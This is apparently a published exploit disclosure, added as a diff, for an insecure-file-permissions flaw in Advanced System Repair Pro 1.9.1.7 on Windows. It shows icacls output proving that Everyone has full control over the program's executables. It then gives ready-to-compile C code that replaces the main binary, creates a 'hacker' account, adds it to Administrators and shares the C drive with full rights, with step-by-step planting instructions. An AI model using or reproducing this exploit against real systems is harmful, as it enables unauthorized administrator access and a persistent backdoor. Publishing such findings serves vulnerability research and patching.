@@ -1,0 +1,47 @@
+# Exploit Title: Advanced System Repair Pro 1.9.1.7 - Insecure File Permissions
+# Exploit Author: ZwX
+# Exploit Date: 2020-01-12
+# Vendor Homepage : https://advancedsystemrepair.com/
+# Software Link: http://advancedsystemrepair.com/ASRProInstaller.exe
+# Tested on OS: Windows 10
+
+
+# Proof of Concept (PoC):
+==========================
+
+C:\Program Files\Advanced System Repair Pro 1.9.1.7.0>icacls *.exe
+AdvancedSystemRepairPro.exe Everyone:(F)
+                            AUTORITE NT\Système:(I)(F)
+                            BUILTIN\Administrateurs:(I)(F)
+                            BUILTIN\Utilisateurs:(I)(RX)
+							
+dsutil.exe Everyone:(F)
+           AUTORITE NT\Système:(I)(F)
+           BUILTIN\Administrateurs:(I)(F)
+           BUILTIN\Utilisateurs:(I)(RX)
+		   
+tscmon.exe Everyone:(F)
+           AUTORITE NT\Système:(I)(F)
+           BUILTIN\Administrateurs:(I)(F)
+           BUILTIN\Utilisateurs:(I)(RX)
+							
+		 
+#Exploit code(s): 
+=================
+
+1) Compile below 'C' code name it as "AdvancedSystemRepairPro.exe"
+
+#include<windows.h>
+
+int main(void){
+ system("net user hacker abc123 /add");
+ system("net localgroup Administrators hacker  /add");
+ system("net share SHARE_NAME=c:\ /grant:hacker,full");
+ WinExec("C:\\Program Files\\Advanced System Repair Pro 1.9.1.7.0\\~AdvancedSystemRepairPro.exe",0);
+return 0;
+} 
+
+2) Rename original "AdvancedSystemRepairPro.exe" to "~AdvancedSystemRepairPro.exe"
+3) Place our malicious "AdvancedSystemRepairPro.exe" in the Advanced System Repair Pro 1.9.1.7.0 directory
+4) Disconnect and wait for a more privileged user to connect and use AdvancedSystemRepairPro IDE. 
+Privilege Successful Escalation
